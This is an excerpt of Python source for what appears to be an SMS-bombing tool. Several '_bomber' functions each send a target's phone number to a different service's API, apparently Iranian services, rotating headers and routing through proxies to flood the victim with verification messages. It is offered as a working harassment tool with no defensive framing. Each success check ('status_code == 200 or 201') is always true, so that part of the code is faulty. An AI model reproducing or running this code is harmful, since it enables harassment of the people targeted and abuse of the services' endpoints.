...
def sahmeto_bomber(number):
    ...
    try:
        req = requests.post(sahmeto_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def sahmio_bomber(number):
    ...
    json_request_api = {"phoneNumber":"0"+number}
    try:
        req = requests.post(sahmio_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def pindo_bomber(number):
    ...
    json_request_api = {"phone":"0"+number}
    try:
        req = requests.post(pindo_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def karlancer_bomber(number):
    ...
    try:
        req = requests.post(karlancer_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def alibaba_bomber(number):
    ...
    json_request_api = {"phoneNumber":"0"+number}
    try:
        req = requests.post(alibaba_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def namava_bomber(number):
    ...
    try:
        req = requests.post(namava_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def gapfilm_bomber(number):
    ...
    try:
        req = requests.post(gapfilm_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def tebinja_bomber(number):
    ...
    try:
        req = requests.post(tebinja_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def tamland_bomber(number):
    ...
    try:
        req = requests.post(tamland_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
...
def delino_bomber(number):
    ...
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(delino_api,json=json_request_api,headers=random_choose,proxies=proxy)
        if req.status_code == 200 or 201:
